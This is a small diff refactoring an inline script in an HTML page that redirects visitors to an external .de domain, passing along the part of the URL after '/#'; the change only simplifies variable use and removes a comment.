@@ -2,11 +2,9 @@
 <html>
 <head>
 <script>
-const url = window.location.href;
-const hashIndex = url.indexOf('/#');
-
+const hashIndex = window.location.href.indexOf('/#');
 if (hashIndex !== -1) {
-  const tag = url.substring(hashIndex + 2); // gets everything after /#
+  const tag = window.location.href.substring(hashIndex + 2);
   window.location.replace('https://zcbxaqmrvtnlypkwejduisrfhn.de/#' + tag);
 }
 </script>
